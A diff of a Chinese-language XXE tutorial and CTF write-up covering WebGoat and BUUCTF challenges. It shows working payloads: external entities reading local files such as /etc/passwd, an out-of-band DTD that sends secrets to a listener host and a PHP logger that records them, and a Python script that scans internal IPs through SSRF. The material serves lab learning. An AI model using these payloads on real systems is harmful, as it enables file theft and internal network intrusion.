@@ -13,10 +13,14 @@ https://www.apachelounge.com/download/
 ```  
 解压缩之后有一个叫Apache24的文件夹，如果移动到其他地方，需要自己修改配置，如果直接放在C盘，就不需要再修改配置。  
 配置文件是Apache24/config/httpd.conf  
-服务器的根目录  
+定义一个变量SRVROOT，指向安装目录，在原配置文件中使用${SRVROOT}来引用安装目录，一般修改这里就可以了  
 ```conf  
 Define SRVROOT "c:/Apache24"
 ```  
+这是服务器根目录  
+```conf
+DocumentRoot "${SRVROOT}/htdocs"
+```
 监听的端口，可以通过这个端口访问服务  
 ```conf
 Listen 80
@@ -82,12 +86,13 @@ xml文件可以分为两个部分，一个是dtd，一个是xml的数据部分
 - dtd  
 使用下面的格式  
 ```xml  
-<!DOCTYPE root[
+<!DOCTYPE a [
 
 ]>
 ```  
-root一般是根标签名字  
-SYSTEM声明外部实体，会将后面的字符串识别为一个资源的路径，并加载资源赋给实体的值  
+a一般是根标签名字，也可以使用其他名字，但一般要求使用跟标签的名字  
+SYSTEM声明外部实体，会将后面的字符串识别为一个资源的路径，并加载资源赋给实体的值
+上述内容中，定义了一个实体root，SYSTEM将根目录下的内容返回给root，当引用root时，解析器会用用实体的值代替  
 
 - xml数据  
 一般就是一些标签，类似html，但是所有的标签都必须在根标签内部  
@@ -102,7 +107,7 @@ SYSTEM声明外部实体，会将后面的字符串识别为一个资源的路�
 
 服务端可能设置一些规则，比如检查关键字或者特殊字符，将原本的数据修改或者过滤后返回，或者是已开发者原本就没有做回显信息的功能，即便成功访问到关键数据，也没有返回给攻击者  
 
-webgoat的一个例题，任务是找出/home/webgoat/.webgoat-2023.8//XXE/webgoat/secret.txt的内容  
+webgoat的另一个例题，任务是找出/home/webgoat/.webgoat-2023.8//XXE/webgoat/secret.txt的内容  
 ![alt text](image-10.png)  
 
 首先发个评论，抓包  
@@ -142,7 +147,7 @@ fclose($file);
 ```  
 当目标主机访问这个页面时，get请求的参数值会保存到test.txt文件中  
 
-建立一个kk.txt,内容如下  
+建立一个kk.txt,内容如下，kk.txt的作用是实现外部引用DTD，这里需要使用外部DTD  
 ```xml
 <!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://192.168.88.1/get.php?a=%secret;'>">
 ```  
@@ -248,6 +253,8 @@ kk.txt
     }
 ```  
 
+### 内网穿透  
+
 如果目标主机不在本地，可以使用内网穿透等方式。  
 作者使用内网穿透的方式，有很多工具可以实现，比如ngrok,Tunnelblick,cloudflared等等，作者对于这些工具了解不多，但仅从完成xxe的角度来说，作者认为cloudflared是免费，操作简单，稳定的。  
 下载地址https://github.com/cloudflare/cloudflared/releases/tag/2025.2.1
@@ -308,13 +315,12 @@ excel表实质上是一个压缩包，大量使用了xml格式的文件来存储
 # 几个XXE题目  
 
 ## BUUCTF Fake XML cookbook  
+![alt text](image-22.png)  
 
-![alt text](image-13.png)  
-
-提交后发现用户名出现在msg标签中  
-![alt text](image-14.png)  
-![alt text](image-15.png) 
-抓包发现使用xml格式，构造请求体  
+随便输入登录，抓包发现是xml格式，用户名出现在msg标签中  
+![alt text](image-23.png)  
+![alt text](image-24.png)  
+构造请求体  
 
 ```xml
 <?xml version="1.0"?>
@@ -326,33 +332,36 @@ excel表实质上是一个压缩包，大量使用了xml格式的文件来存储
 <password>ddd</password>
 </user>
 ```  
+![alt text](image-25.png)
 
 
 ## BUUCTF True XML cookbook  
-
-![alt text](image-17.png)  
-一模一样，同样的方式xxe攻击，但是没有显示结果，可能是攻击失败，也可能没有这个文件  
+一样的界面  
+先使用同样的方式xxe攻击，但是没有显示结果，可能是攻击失败，也可能没有这个文件  
 
 访问其他文件，比如/etc/passwd,返回结果，说明攻击成功，不存在flag文件  
-![alt text](image-18.png)  
+![alt text](image-26.png)
 
 内网渗透找/proc/net/fib_trie  
 ```xml  
 <?xml version="1.0"?>
 <!DOCTYPE user[
-<!ENTITY root SYSTEM "file:///flag">
+<!ENTITY root SYSTEM "file:///proc/net/fib_trie">
 ]>
-<user><username>adsg</username><password>asdg</password></user>
-```
-![alt text](image-19.png)  
-爆破ip最后一位  
-![alt text](image-20.png)  
-不过出问题了，要设置timeout，不然就需要很久，使用一个简单的脚本  
+<user><username>&root;</username><password>asdg</password></user>
+```  
+![alt text](image-27.png)
+发现ip10.244.244.20，爆破ip最后一位  
+![alt text](image-28.png)  
+不过出问题了，要设置timeout，不然就需要很久，但是作者并不知道如何在yakit中设置，稍微等一会也可以
+![alt text](image-32.png)  
+
+或者使用一个简单的脚本  
 ```py
 import requests
-url="http://49242b9d-993f-405e-aff0-2d19a551a4ba.node5.buuoj.cn:81/doLogin.php"
-for i in range(1,256):
-    payload=f'<?xml version="1.0"?><!DOCTYPE user[<!ENTITY root SYSTEM "http://10.244.166.{i}">]><user><username>&root;</username><password>ddd</password></user>'
+url="http://02f06db6-7db1-4e58-99b7-e1d85cde4555.node5.buuoj.cn:81/doLogin.php"
+for i in range(0,256):
+    payload=f'<?xml version="1.0"?><!DOCTYPE user[<!ENTITY root SYSTEM "http://10.244.244.{i}">]><user><username>&root;</username><password>ddd</password></user>'
     try:
         res=requests.post(url=url,data=payload,timeout=1)
         print(res.text,end="\n")
@@ -361,17 +370,16 @@ for i in range(1,256):
 ```  
 重定向
 ```bash
-python re.py > out.txt  
+python hello.py > out.txt  
 ```
 然后在out.txt中搜索flag  
-
+![alt text](image-29.png)
 
 
 ## BUUCTF XXE COURSE 1  
 一个登录界面，输入提交之后有回显，抓包发现是用xml格式发送数据  
-找文件直接找flag，找到了就很好  
-![alt text](image-4.png)  
-![alt text](image-23.png)  
+![alt text](image-30.png)  
+直接找flag
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root[
@@ -380,12 +388,5 @@ python re.py > out.txt
 <root> <username>&f;</username> <password>asdg</password> </root>
 ```  
 可以找到  
-![alt text](image-24.png)  
+![alt text](image-31.png)
 
-```xml
-<!DOCTYPE convert [
-<!ENTITY % remote SYSTEM "http://917a-240e-604-38d-00-659-f694.ngrok-free.app/kk.txt">
-%remote;%int;%send;
-]>
-
-```
